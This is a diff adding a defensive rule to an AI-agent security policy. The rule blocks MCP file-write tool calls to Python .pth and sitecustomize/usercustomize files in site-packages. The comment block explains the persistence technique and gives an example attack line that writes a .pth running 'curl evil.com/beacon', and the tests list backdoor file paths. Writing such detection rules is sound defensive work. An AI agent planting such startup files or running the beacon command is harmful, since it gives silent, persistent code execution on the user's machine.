@@ -970,6 +970,75 @@ structural_rules:
         - tool: "write_file"
           args: {"path": "/project/scripts/ipython_utils.py"}
 
+  # === BLOCK: Python .pth file and sitecustomize.py writes to site-packages via MCP (issue #508) ===
+  #
+  # Python's site module auto-processes .pth files in every site-packages/dist-packages
+  # directory on EVERY Python invocation. A .pth file line starting with "import" executes
+  # arbitrary code. Similarly, sitecustomize.py and usercustomize.py are auto-imported
+  # before user code on every Python start.
+  #
+  # Unlike the shell rules (ts-block-python-pth-write / ts-block-python-sitecustomize-write),
+  # this covers the MCP vector: an agent can call write_file(path=".../evil.pth") directly
+  # with no shell command for AgentShield to intercept.
+  #
+  # Covered paths:
+  #   **/site-packages/*.pth           — user + system site-packages (Linux/macOS)
+  #   **/dist-packages/*.pth           — Debian/Ubuntu system Python
+  #   **/site-packages/sitecustomize.py — auto-imported before user code
+  #   **/site-packages/usercustomize.py — user-level Python startup hook
+  #   **/dist-packages/sitecustomize.py / usercustomize.py
+  #
+  # Attack scenario:
+  #   write_file(path="/home/user/.local/lib/python3.11/site-packages/z_init.pth",
+  #              content="import os; os.system('curl evil.com/beacon')")
+  #   → Runs silently on every: python3, pip, pytest, django-admin, jupyter, ...
+  #
+  # TN carve-out: reading .pth files (read_file tool) is benign — pip/virtualenv does this
+  # legitimately. Only writes/creates/edits are blocked.
+  #
+  # Shell-level analogues: ts-block-python-pth-write, ts-block-python-pth-tee,
+  #   ts-block-python-pth-cp, ts-block-python-sitecustomize-write
+  #
+  # MITRE T1546.016 — Installer Packages (Python .pth / startup persistence)
+  # MITRE T1059.006 — Command and Scripting Interpreter: Python
+  - id: mcp-persist-block-python-pth-write
+    taxonomy: "persistence-evasion/shell-startup/shell-profile-backdoor"
+    match:
+      tool_name_any:
+        - "write_file"
+        - "create_file"
+        - "edit_file"
+        - "write_to_file"
+        - "save_file"
+        - "update_file"
+        - "append_file"
+        - "filesystem_write"
+        - "str_replace_editor"
+        - "str_replace_based_edit_tool"
+      args_match:
+        path:
+          pattern_any:
+            - "(?:^|/)(?:site|dist)-packages/[^/]+\\.pth$"
+            - "(?:^|/)(?:site|dist)-packages/(?:site|user)customize\\.py$"
+    decision: "BLOCK"
+    reason: "MCP write to Python .pth file or sitecustomize.py/usercustomize.py in site-packages — these files execute automatically on every Python invocation, providing silent persistent code execution across pip, pytest, jupyter, and all Python tooling. MITRE T1546.016."
+    confidence: 0.95
+    tests:
+      tp:
+        - tool: "write_file"
+          args: {"path": "/home/user/.local/lib/python3.11/site-packages/evil.pth"}
+        - tool: "create_file"
+          args: {"path": "/usr/local/lib/python3.10/dist-packages/z_backdoor.pth"}
+        - tool: "write_file"
+          args: {"path": "/home/user/.local/lib/python3.11/site-packages/sitecustomize.py"}
+        - tool: "write_file"
+          args: {"path": "/usr/lib/python3/dist-packages/usercustomize.py"}
+      tn:
+        - tool: "read_file"
+          args: {"path": "/home/user/.local/lib/python3.11/site-packages/easy-install.pth"}
+        - tool: "write_file"
+          args: {"path": "/project/scripts/site_utils.py"}
+
   # === BLOCK: XDG applications directory .desktop file writes via MCP (issue #384) ===
   #
   # ~/.local/share/applications/ is the XDG user-level application registry.
